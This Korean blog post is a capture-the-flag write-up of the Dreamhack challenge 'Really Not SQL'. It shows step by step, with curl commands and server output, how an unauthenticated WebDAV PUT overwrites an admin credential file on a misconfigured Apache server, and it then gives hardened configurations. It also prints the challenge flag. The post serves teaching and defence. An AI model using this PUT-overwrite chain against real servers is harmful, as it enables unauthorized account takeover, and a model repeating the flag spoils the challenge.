---
layout: post
title:  "Dreamhack 워게임 Really Not SQL 풀이 — Apache WebDAV PUT 으로 사용자 JSON 덮어쓰고 admin 로그인"
date:   2026-05-19 10:30:00 +0900
categories: security web wargame dreamhack writeup webdav apache misconfiguration auth-bypass
---

## 들어가며

Dreamhack 웹해킹 워게임 **Really Not SQL** (난이도 별 1, 풀이자 424명) 풀이입니다. 이름과 한 줄 설명 — "Really not SQL, Just JSON" — 만 보면 NoSQL 인젝션을 떠올리게 만드는 미끼지만, 실제 의도된 풀이는 **Apache 설정 실수로 켜진 WebDAV + 너무 좁은 `.htaccess` `<Limit DELETE>` 가드** 입니다. 그래서 진짜 카테고리는 SQLi 도 NoSQL 도 아니고 "HTTP method 잘못 열어둔 misconfiguration".

문제 설명:

> Description
>
> Really not SQL, Just JSON

스포일러 결론부터:

```bash
SERVER="http://host8.dreamhack.games:PORT"
HASH=$(echo -n "pwn" | shasum -a 256 | awk '{print $1}')

# 1) WebDAV PUT 으로 admin.json 을 통째로 갈아끼움 — 내가 아는 비밀번호로
curl -X PUT "$SERVER/user/admin.json" \
  --data "{\"no\":0,\"id\":\"admin\",\"password\":\"$HASH\"}"
# → HTTP/1.1 204 No Content

# 2) 그 비밀번호로 admin 로그인
curl -c jar.txt -X POST "$SERVER/login.php" \
  --data-urlencode "username=admin" --data-urlencode "password=pwn"

# 3) 플래그 회수
curl -b jar.txt "$SERVER/flag.php"
# → DH{un5AfE_Http_M37hod_coNfig_X.X:pb52cY//rGQ9BiwVuYOx3g==}
```

플래그 본문에 `un5AfE_Http_M37hod_coNfig` 가 박혀 있죠 — 출제자가 정답 카테고리를 친절하게 적어놓은 셈입니다.

## 1. 자료 파악 — 어디에 무엇이 있나

ZIP 의 구조:

```
deploy/
├── Dockerfile
├── flag                ← /flag 로 컨테이너에 복사됨
├── run.sh              ← apachectl -DFOREGROUND
├── 000-default.conf    ← Apache vhost — 여기에 함정 ★
├── .htaccess           ← user/ 디렉토리에 깔리는 가드 ★
└── src/                ← /var/www/html
    ├── index.php       ← 로그인 / 프로필 편집 메뉴
    ├── login.php       ← POST 로 admin/guest 로그인
    ├── edit_profile.php← admin 전용 비밀번호 변경
    ├── flag.php        ← admin 세션이면 /flag 출력
    └── user/
        ├── admin.json  ← {"id":"admin","password":"<sha256>"}
        └── guest.json  ← {"id":"guest","password":"<sha256>"}
```

웹 루트가 둘로 나뉘어 있다는 게 핵심입니다. PHP 가 도는 일반 영역과, **사용자 JSON 이 사는 `/user/` 디렉토리**.

## 2. 1차 코드 리뷰 — 인증 로직 자체는 의외로 단단하다

`login.php` 본문:

```php
if ($username !== "admin" && $username !== "guest") {
    $error = "User not found";
} else {
    $userData = json_decode(file_get_contents($filepath), true);
    if ($userData['id'] !== $username){
        $error = "Error occured";
    } else if ($userData['password'] !== hash("sha256", $password)) {
        $error = "Invalid password";
    } else {
        $_SESSION['user'] = $username;
        $success = true;
    }
}
```

처음에는 SQLi 일까 NoSQLi 일까 의심하게 됩니다. 하지만:

- `username` 은 **하드코딩 화이트리스트 `admin/guest`** 만 통과. → 임의 파일 이름 조작 불가. `../../etc/passwd.json` 류 path traversal 도 차단됨.
- `===` / `!==` 엄격 비교로 PHP 의 그 유명한 `0 == "string"` 같은 type-juggling 도 안 통함.
- 비밀번호도 SHA-256 결정적 해시, 길이가 길어 무차별 대입은 사실상 불가.
- `file_get_contents($filepath)` 로 파일 내용을 신뢰. **JSON 파일이 정상 값이라는 전제**.

→ 인증 로직 자체로는 흠이 거의 없다. 그렇다면 **인증의 입력값(`admin.json`) 을 우리가 임의로 만들 수 있어야 한다**.

그리고 정말로, 만들 수 있게 되어 있습니다.

## 3. 진짜 함정 — Apache vhost 가 `/user/` 에서 WebDAV 를 켜놓음

`000-default.conf`:

```apache
<VirtualHost *:80>
  DocumentRoot /var/www/html

  <Directory /var/www/html/>
     AllowOverride None
     Require all granted
  </Directory>

  <Directory /var/www/html/user/>
      DAV On                    ← ★ 이 한 줄
      Options Indexes
      AllowOverride All
      Require all granted
  </Directory>
</VirtualHost>
```

`DAV On` — `/user/` 안에서는 **WebDAV 프로토콜이 켜져 있다**. WebDAV (RFC 4918) 는 HTTP 위에 PUT / DELETE / MKCOL / COPY / MOVE / PROPFIND / LOCK / UNLOCK 등을 추가해서, HTTP 만으로 원격 파일시스템처럼 쓸 수 있게 해주는 확장입니다. **요즘 거의 안 쓰는 레거시** 지만 mod_dav 는 Apache 에 기본 모듈로 있고, 한 번 켜지면 디렉토리에 PUT 으로 파일을 통째로 올릴 수 있습니다.

Dockerfile 에서:

```
RUN a2enmod dav
RUN a2enmod dav_fs
```

→ 모듈도 활성화. 그리고:

```
RUN chmod 777 /var/www/html/user/
RUN chmod 666 /var/www/html/user/*.json
```

→ 디렉토리 쓰기 권한, JSON 파일 쓰기 권한도 OS 레벨에서 활짝 열림. Apache 사용자(`www-data`) 가 admin.json 을 덮어쓸 수 있는 모든 조건이 갖춰졌습니다.

### 3.1 가드는 단 한 줄 — `<Limit DELETE>`

`deploy/.htaccess`:

```apache
<Limit DELETE>
        Require all denied
</Limit>
```

이게 전부입니다. **DELETE 메서드만** 거부. PUT 도, MOVE 도, COPY 도, MKCOL 도 전부 허용. 즉 "파일 삭제는 막았으니까 위험한 건 다 막은 거지" 라는 안일한 가정 위에서 만들어진 가드입니다.

> 자주 빠지는 함정: `<Limit X>` 는 "X 만 영향을 준다" 가 아니라 "X **만** 제한한다" 입니다. `Allow except DELETE` 를 의도했더라도, 다른 method 는 그냥 디폴트(=허용) 로 흘러갑니다. WebDAV 환경에선 `<LimitExcept GET POST HEAD>` 처럼 **화이트리스트 형태**로 적어야 안전.

### 3.2 진짜 그런지 OPTIONS 로 확인

서버 부팅 후:

```bash
$ curl -i -X OPTIONS http://SERVER/user/admin.json
HTTP/1.1 200 OK
DAV: 1,2
DAV: <http://apache.org/dav/propset/fs/1>
MS-Author-Via: DAV
Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,PUT,LOCK,UNLOCK
```

`DAV: 1,2` 헤더 + `Allow:` 에 PUT, COPY, MOVE, LOCK 까지 → **WebDAV 완전 가동**. DELETE 도 형식상 Allow 에 적혀 있지만 실제로 호출하면 .htaccess 가드에 막힙니다. 우리에게 필요한 건 PUT 이라 상관없어요.

## 4. 익스플로잇 — PUT 으로 admin.json 통째 갈아끼우기

### 4.1 단순 3단 체인

1. `pwn` 의 SHA-256 을 미리 계산:
   ```bash
   $ echo -n "pwn" | shasum -a 256
   e0af3d118bcd6f56105b722639793e20212f5d24abc099286625fc72a24f3c9b  -
   ```
2. WebDAV PUT 으로 admin.json 통째 덮어쓰기:
   ```bash
   curl -X PUT "$SERVER/user/admin.json" \
     --data '{"no":0,"id":"admin","password":"e0af3d11...3c9b"}'
   # → HTTP/1.1 204 No Content
   ```
   덮어쓴 게 맞는지 확인:
   ```bash
   curl "$SERVER/user/admin.json"
   # → {"no":0,"id":"admin","password":"e0af3d11...3c9b"}
   ```
3. 위 비밀번호(`pwn`) 로 admin 로그인:
   ```bash
   curl -c jar.txt -X POST "$SERVER/login.php" \
     --data-urlencode "username=admin" --data-urlencode "password=pwn"
   ```
4. 플래그 회수:
   ```bash
   curl -b jar.txt "$SERVER/flag.php"
   # → DH{un5AfE_Http_M37hod_coNfig_X.X:pb52cY//rGQ9BiwVuYOx3g==}
   ```

### 4.2 왜 이게 다 통과되는가, 한 단계씩

- `login.php` 의 `$username !== "admin"` 가드 → 우리 username 은 `admin` 이라 통과 ✅
- `file_get_contents($filepath)` → **우리가 PUT 으로 덮어쓴 JSON** 을 로드. ✅
- `$userData['id'] !== $username` → JSON 의 id 도 우리가 `"admin"` 으로 적었음 ✅
- `$userData['password'] !== hash("sha256", $password)` → JSON 의 password 가 sha256("pwn") 이고, 우리가 보낸 password 도 "pwn" → 양쪽 hash 일치 ✅
- `$_SESSION['user'] = "admin"` → 세션에 admin 박힘 ✅
- `flag.php` 의 `$_SESSION['user'] !== "admin"` → 통과, FLAG 출력 ✅

미인증 PUT 한 번이 인증 시스템 전체를 우회한 거죠.

> 비유: 회사 보안카드 검증 시스템은 멀쩡한데, "직원 명단" 이라는 종이를 안내데스크 위에 놓아두고 아무나 추가/수정할 수 있게 만든 상황. 명단에 내 이름이랑 사진 붙여놓고 보안카드 검사를 통과시키는 그림.

## 5. 한 번 더 정리 — 무엇을 배웠나

### 5.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| `/user/` 에 `DAV On` | Misconfiguration | DAV 모듈을 켤 필요가 없는 경로에 켜둠 |
| `<Limit DELETE>` 만 deny | Insufficient Method Restriction | 블랙리스트 한 줄로 끝낸 가드 |
| `chmod 666 *.json` | Excessive Permissions | 데이터 파일에 www-data 쓰기 권한 |
| `file_get_contents` 로 세션 근거 만듦 | Trust on Compromised Data | 인증 근거 파일을 인증 없이 쓸 수 있는 곳에 둠 |

### 5.2 같은 코드를 안전하게 고친다면

WebDAV 자체가 필요 없는 케이스라면:

```apache
<Directory /var/www/html/user/>
    # DAV On          ← 그냥 끈다
    Options -Indexes
    AllowOverride None
    Require all granted
</Directory>

# .json 정적 응답은 막고 PHP 경유로만 접근하도록
<FilesMatch "\.json$">
    Require all denied
</FilesMatch>
```

만약 DAV 가 진짜 필요하다면, 최소한 **method 화이트리스트 + 인증** 을 함께:

```apache
<Directory /var/www/html/user/>
    DAV On
    <LimitExcept GET POST HEAD OPTIONS>      ← 화이트리스트
        AuthType Basic
        AuthName "WebDAV"
        AuthUserFile /etc/apache2/dav.passwd
        Require valid-user
    </LimitExcept>
</Directory>
```

그리고 파일 권한도 `640` 이상으로 좁히고, 인증 근거가 되는 데이터(admin.json 같은) 는 애초에 **DocumentRoot 바깥**으로 옮기는 게 정석.

### 5.3 입문자가 챙겨가면 좋은 관점

- **"쓰기" 가 가능한 모든 곳은 위험하다**. 정적 파일이라도 인증 근거로 쓰면 안 됨.
- **`<Limit X>` vs `<LimitExcept Y>`** 의 차이는 시험 안 나오는 사소한 디테일처럼 보이지만, 위험한 WebDAV 환경에선 정반대 결과를 만든다.
- 출제자가 플래그에 `un5AfE_Http_M37hod_coNfig` 같은 힌트를 박는 건 사실상 "출제 의도 캡션" 이다. 풀이 후엔 플래그 본문을 한 번 더 읽어보면 출제 카테고리를 복습할 수 있음.

## 6. 시도했지만 실패한 것들 (회고)

이번 회차는 비교적 깔끔하게 진행된 편이지만, 시작 전 한 번 우회 경로를 의심한 흔적은 남겨둡니다.

### 6.1 시도 — JSON deserialize / PHP type juggling 노림

"Just JSON" 이라는 한 줄 설명에 낚여서 처음엔:

- `json_decode($json, true)` 의 결과로 `id` 가 정수 0 처럼 들어왔을 때 `$_POST['username']` 의 문자열 `"admin"` 과 `==` 비교를 했다면 `0 == "admin"` 이 옛 PHP 에선 참이 되는 함정 → **확인 결과 코드가 `!==` 엄격 비교라 막혀 있음**.
- `$_POST['username']` 을 배열로 보내서 `$username !== "admin"` 비교를 깨려고 시도 → **PHP 에선 `array !== string` 이 항상 참(둘 다 다른 타입)이라 화이트리스트에 막힘**. Node 의 `qs` 처럼 안 풀림.
- `username=admin\0` 같은 null byte 로 `.json` 부분을 잘라내려는 시도 → `$username !== "admin"` 가드부터 막힘.

**회고**: 코드 리뷰 1차 패스에서 `===`/`!==` 가 보였으면 즉시 type juggling 경로를 끄고 "그러면 인증 근거 자체를 갈아끼울 수 있는가?" 로 가설을 옮겼어야 했음. 다행히 10분 안에 갈아탔지만, "제목/설명 미끼" 에 끌려 들어가는 시간을 줄이는 게 다음 과제. 코드의 **"어디서 입력이 들어와서 어디로 신뢰가 흘러가는가"** 를 데이터 플로우로 먼저 그리는 게 정공법.

---

이번 풀이의 한 줄 정리: **WebDAV 가 켜진 디렉토리에 인증의 근거가 되는 데이터를 두지 말 것**.
